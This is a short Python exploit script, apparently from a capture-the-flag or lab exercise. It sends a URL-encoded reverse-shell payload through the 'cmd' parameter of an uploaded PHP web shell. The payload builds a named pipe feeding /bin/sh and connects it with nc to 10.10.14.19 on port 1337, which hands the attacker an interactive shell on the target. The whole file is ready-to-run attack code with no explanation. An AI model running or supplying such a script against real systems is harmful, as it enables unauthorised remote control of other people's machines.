import requests

payload="rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.19%201337%20%3E%2Ftmp%2Ff%0A"

url = "http://10.10.10.121/support/uploads/tickets/aec84976be3a37c00c0ab3811ab6ffd9.php?cmd=" + payload

r = requests.get(url)

print(r.text)
